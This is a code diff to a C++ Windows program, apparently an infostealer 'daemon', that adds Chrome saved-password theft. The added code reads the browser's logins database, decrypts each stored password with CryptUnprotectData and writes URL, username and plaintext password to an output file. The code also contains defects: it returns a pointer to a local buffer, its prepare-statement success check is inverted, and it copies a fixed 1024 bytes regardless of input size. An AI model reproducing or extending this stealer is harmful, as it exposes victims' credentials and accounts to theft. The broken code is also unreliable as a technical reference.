@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <Wincrypt.h>
 #include <tchar.h>
 #include <cstdio>
 #include <cstdlib>
@@ -136,14 +137,28 @@ inline std::filesystem::path get_pass_path(){
     return hist_path;
 }
 
+//This function decrypts the password
+char * decrypt_pass(BYTE *pass){
+    DATA_BLOB in;
+	DATA_BLOB out;
 
-//This function is more complex the process_history(...), It has to decrypt the passwords 
-int process_pass(void *NotUsed, int argc, char **argv, char **azColName){
-    for (short i = 0; i < argc; i++){
-        write_endl(argv[i], PFILE);
-    }
-    
-    return 0;
+	BYTE trick[1024];
+	memcpy(trick, pass, 1024);
+	int size = sizeof(trick) / sizeof(trick[0]);
+
+	in.pbData = pass;
+	in.cbData = size + 1;//we can't use strlen on a byte pointer,becouse of the NBs,so we have to be tricky dicky:)
+	char str[1024] = "";
+
+	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
+		for (int i = 0; i<out.cbData; i++)
+			str[i] = out.pbData[i];
+		str[out.cbData] = '\0';
+
+		return str;
+	}
+	else
+		return NULL; //Error on decryption
 }
 
 void get_pass(const char* histpath){
@@ -152,6 +167,7 @@ void get_pass(const char* histpath){
     char *err = 0;
     int rc;
     std::string sql;
+    sqlite3_stmt *stmt;
 
     //I don't remember this specifics of this part
     rc = sqlite3_open(histpath, &histdb);
@@ -164,13 +180,40 @@ void get_pass(const char* histpath){
     sql = "Select action_url, username_value, password_value FROM logins;";
 
     //Execute the sql command. Pass the urls to process_history
-    sqlite3_exec(histdb, sql.c_str(), process_pass, 0, &err);
+    //sqlite3_exec(histdb, sql.c_str(), process_pass, 0, &err);
+
+    
+
+    if (sqlite3_prepare_v2(histdb, sql.c_str(), -1, &stmt, 0)){
+        write_endl("Starting Passwords", PFILE);
+        while (sqlite3_step(stmt) == SQLITE_ROW){
+            char *url = (char *)sqlite3_column_text(stmt, 0);
+            char *username = (char *)sqlite3_column_text(stmt, 1);
+            BYTE *pass = (BYTE *)sqlite3_column_text(stmt, 2); // this is encrypted
+
+            char *decpass = decrypt_pass(pass);
+
+            //Write like this:
+            // URL -> USERNAME -> PASSWORD\n
+            write(url, PFILE);
+            write(" -> ", PFILE);
+            write(username, PFILE);
+            write(" -> ", PFILE);
+            write(decpass, PFILE);
+            write_endl(" -> ", PFILE);
+        
+        }
+    }else {
+        write("SQLITE3 PREPARE ERROR", PFILE);
+    }
+
+
 }
 
 void init_passwordd(){
-    //Initialize historyd
+    //Initialize passwordd
 
-    std::filesystem::path passfile = get_hist_path();
+    std::filesystem::path passfile = get_pass_path();
     
     write_endl(std::string("Checking for chrome installation"), PFILE);
 
@@ -186,7 +229,7 @@ void init_passwordd(){
         }
         
         //The main stuff goodness is here
-        get_history(std::string(passfile).c_str());
+        get_pass(std::string(passfile).c_str());
     } 
     else {
         write_endl("No installation, killing daemon.", PFILE);
